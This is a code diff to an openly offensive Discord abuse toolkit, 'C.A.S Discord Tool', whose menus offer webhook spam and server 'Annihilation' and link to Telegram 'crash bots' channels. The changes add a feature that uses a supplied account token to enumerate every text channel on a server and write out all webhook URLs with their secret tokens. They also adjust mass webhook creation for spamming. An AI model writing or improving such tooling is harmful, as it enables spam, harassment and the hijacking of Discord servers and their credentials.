@@ -11,13 +11,13 @@ cls = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')
 
 updateStatus = ''
 updateSoft = ''
-
+currentVersion = ''
 dataProject = requests.get('https://raw.githubusercontent.com/TheWay-hue/C.A.S-Discord-Tool-v4/master/metadata.json')
 version1 = (dataProject.json()['Version'])
 with open('metadata.json', 'r') as f:
 	config = json.load(f)
-	version2 = config['Version']
-	if version2 < version1:
+	currentVersion = config['Version']
+	if currentVersion < version1:
 		updateStatus = 'Update the utility using item 18'
 		updateSoft = True
 	else:
@@ -31,9 +31,10 @@ exitMenu = '''\nTo return to the menu, use the combination Ctrl + C.'''
 webhookMenu = '''\n[1] - Spam for 1 webhook.
 [2] - Spam webhook from webhooks.txt.
 [3] - Spam via token with webhook rights.
-[4] - Delete webhook.
-[5] - Get webhook info.
-[6] - Help.'''
+[4] - Get all webhooks from the server.
+[5] - Delete webhook.
+[6] - Get webhook info.
+[7] - Help.'''
 
 annihilationMenu = '''\n[1] - Annihilation.
 [2] - Help.'''
@@ -246,7 +247,7 @@ intro = (f'''
  [ C.A.S ]~>           [{updateStatus}]
  
  [ Discord Tool Set. 
- [ version 4.1       
+ [ version {currentVersion}       
  [ Created by Cyber-Crypto.Anarchy.Squad
  [ Telegram C.A.S - https://t.me/anarchy_squad
  [ Telegram Hydra crash bots - https://t.me/EvLVHydraNews
@@ -330,6 +331,7 @@ def Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses):
 		elif select == '3':
 			channels = []
 			x = 1
+			d = 1
 			file = open('webhooks.txt', 'w')
 			token = input('\nToken: ')
 			serverID = input('\nServer id: ')
@@ -353,18 +355,23 @@ def Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses):
 				if result == True:
 					header = {'Content-Type': 'application/json', 'Authorization': token}
 					request = requests.post(f'https://discord.com/api/v8/channels/{channels[0]}/webhooks', headers=header, json=jsonHook)
+					print(request.json())
 					if request.status_code == 200:
 						while x <= 2:
 							for channelID in channels:
-								header = {'Content-Type': 'application/json', 'Authorization': token}
-								request = requests.post(f'https://discord.com/api/v8/channels/{channelID}/webhooks', headers=header, json=jsonHook)
-								if request.status_code in statuses:
-									data = request.json()
-									webhookID = data['id']
-									webhookToken = data['token']
-									file.write(f'https://discordapp.com/api/webhooks/{webhookID}/{webhookToken}\n')
+								if d <= 30:
+									header = {'Content-Type': 'application/json', 'Authorization': token}
+									request = requests.post(f'https://discord.com/api/v8/channels/{channelID}/webhooks', headers=header, json=jsonHook)
+									if request.status_code in statuses:
+										data = request.json()
+										webhookID = data['id']
+										webhookToken = data['token']
+										file.write(f'https://discordapp.com/api/webhooks/{webhookID}/{webhookToken}\n')
+									else:
+										errorLog.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n")
+									d += 1
 								else:
-									errorLog.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n")
+									break
 							x += 1
 						print('\nSpam started.')
 						file.close()
@@ -387,6 +394,32 @@ def Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses):
 				print('\nError')
 				errorLog.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n")
 		elif select == '4':
+			channels = []
+			x = 1
+			file = open('webhooks.txt', 'w')
+			token = input('\nToken: ')
+			serverID = input('\nServer id: ')
+			headers = {'Authorization': token}
+			request = requests.get(f'https://discord.com/api/v8/guilds/{serverID}/channels', headers=headers)
+			if request.status_code == 200:
+				for channel in request.json():
+					if channel["type"] == 0:
+						channels.append(channel['id'])
+				print(channels)
+				result = any(channels)
+				if result == True:
+					for channel in channels:
+						request = requests.get(f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers).json()
+						if any(request) == True:
+							for req in request:
+								file.write(f'https://discord.com/api/webhooks/{req["id"]}/{req["token"]}\n')						
+				else:
+					print('\nError')
+			else:
+				print('\nError')
+				errorLog.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n")
+				print('\nGrabbed all webhooks.')
+		elif select == '5':
 			webhook = str(input('\nWebhook: '))
 			req = requests.delete(webhook)
 			if req.status_code == 200:
@@ -394,7 +427,7 @@ def Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses):
 			else:
 				print('\nError')
 				errorLog.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n")
-		elif select == '5':
+		elif select == '6':
 			webhook = str(input('\nWebhook: '))
 			req = requests.get(webhook)
 			if req.status_code == 200:
